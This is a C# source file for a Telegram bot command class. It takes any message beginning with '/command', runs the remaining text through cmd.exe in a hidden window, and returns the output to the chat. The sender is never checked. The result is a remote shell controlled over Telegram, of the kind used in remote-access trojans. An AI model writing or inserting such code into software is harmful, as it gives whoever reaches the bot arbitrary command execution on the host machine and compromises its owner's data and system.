using System.Diagnostics;
using System.IO;
using Telegram.Bot;
using Telegram.Bot.Args;

namespace TelegramBot.Commands
{
    class Command : ICommands
    {
        private string CommandString { get; set; }
        private ITelegramBotClient BotClient { get; set; }

        public Command(string command, ITelegramBotClient botClient)
        {
            CommandString = command;
            BotClient = botClient;
        }

        public string Logic(string command)
        {
            ProcessStartInfo request = new ProcessStartInfo(@"cmd.exe", @"/C " + command);
            request.WindowStyle = ProcessWindowStyle.Hidden;
            request.RedirectStandardOutput = true;
            request.UseShellExecute = false;
            request.CreateNoWindow = true;
            Process procCommand = Process.Start(request);
            if (procCommand != null)
            {
                StreamReader answer = procCommand.StandardOutput;
                return answer.ReadToEnd();
            }

            return "Something went wrong.";
        }

        public async void Api(object sender, MessageEventArgs e)
        {
            if (e.Message.Text.StartsWith("/command"))
            {
                string commandaswer;

                if (e.Message.Text.Length == 8)
                {
                    commandaswer = Logic(CommandString);
                }
                else
                {
                    var newmessage = e.Message.Text.Remove(0, 9);
                    commandaswer = Logic(newmessage);
                }
                await BotClient.SendTextMessageAsync(
                    chatId: e.Message.Chat,
                    text: commandaswer
                );
            }
        }
    }
}